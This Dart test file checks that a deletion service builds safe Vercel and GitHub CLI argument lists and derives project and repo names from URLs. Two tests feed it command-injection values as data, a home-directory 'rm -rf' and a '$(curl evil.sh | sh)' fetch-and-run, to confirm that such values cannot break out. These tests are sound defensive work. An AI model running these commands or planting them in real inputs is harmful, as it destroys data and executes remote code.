import 'package:test/test.dart';

import 'package:pro_orc/data/services/external_deletion_service.dart';

void main() {
  group('buildVercelDeleteArgs', () {
    test('builds the exact expected argument list', () {
      final args = buildVercelDeleteArgs('my-project');

      expect(args, ['project', 'remove', 'my-project', '--yes']);
    });

    test('a project name containing shell metacharacters is passed as a '
        'single discrete argument and cannot break out or chain a command', () {
      const malicious = 'my-project; rm -rf ~ && echo "\$(whoami)" `id`';

      final args = buildVercelDeleteArgs(malicious);

      // The dangerous value must appear as exactly ONE list element,
      // never split, concatenated, or exposed as a raw shell string. As
      // long as it stays a single element passed via Process.run's args
      // list (not runInShell string interpolation), the shell never
      // parses its metacharacters.
      expect(args, ['project', 'remove', malicious, '--yes']);
      expect(args.length, 4);
      expect(args, isNot(contains(';')));
      expect(args, isNot(contains('rm')));
    });
  });

  group('buildGhDeleteArgs', () {
    test('builds the exact expected argument list', () {
      final args = buildGhDeleteArgs('owner/repo');

      expect(args, ['repo', 'delete', 'owner/repo', '--yes']);
    });

    test('an owner/repo value containing shell metacharacters is passed as a '
        'single discrete argument and cannot break out or chain a command', () {
      const malicious = 'owner/repo\$(curl evil.sh | sh)`touch /tmp/pwn`';

      final args = buildGhDeleteArgs(malicious);

      expect(args, ['repo', 'delete', malicious, '--yes']);
      expect(args.length, 4);
    });
  });

  group('deriveVercelProjectName', () {
    test('derives the last path segment from a dashboard URL', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project',
      );

      expect(name, 'my-project');
    });

    test('derives the last path segment from a nested dashboard URL', () {
      final name = deriveVercelProjectName(
        'https://vercel.com/my-scope/my-project/deployments',
      );

      expect(name, 'deployments');
    });

    test('returns null for a *.vercel.app deployment URL', () {
      final name = deriveVercelProjectName(
        'https://my-app-abc123xyz.vercel.app',
      );

      expect(name, isNull);
    });

    test('returns null for the bare vercel.app host', () {
      final name = deriveVercelProjectName('https://vercel.app');

      expect(name, isNull);
    });

    test('returns null for a non-vercel URL', () {
      final name = deriveVercelProjectName('https://example.com/foo/bar');

      expect(name, isNull);
    });

    test('returns null for an unparsable URL', () {
      final name = deriveVercelProjectName('not a url at all ::::');

      expect(name, isNull);
    });

    test('returns null when the dashboard URL has no path segments', () {
      final name = deriveVercelProjectName('https://vercel.com');

      expect(name, isNull);
    });
  });

  group('deriveGhOwnerRepo', () {
    test('derives owner/repo from a GitHub URL', () {
      final ownerRepo = deriveGhOwnerRepo(
        'https://github.com/n3urala1-rob/a1-pro-orc',
      );

      expect(ownerRepo, 'n3urala1-rob/a1-pro-orc');
    });

    test('ignores extra path segments beyond owner/repo', () {
      final ownerRepo = deriveGhOwnerRepo(
        'https://github.com/n3urala1-rob/a1-pro-orc/issues/5',
      );

      expect(ownerRepo, 'n3urala1-rob/a1-pro-orc');
    });

    test('returns null when only owner is present (no repo segment)', () {
      final ownerRepo = deriveGhOwnerRepo('https://github.com/n3urala1-rob');

      expect(ownerRepo, isNull);
    });

    test('returns null for a non-github URL', () {
      final ownerRepo = deriveGhOwnerRepo('https://example.com/a/b');

      expect(ownerRepo, isNull);
    });

    test('returns null for an unparsable URL', () {
      final ownerRepo = deriveGhOwnerRepo('not a url at all ::::');

      expect(ownerRepo, isNull);
    });
  });
}
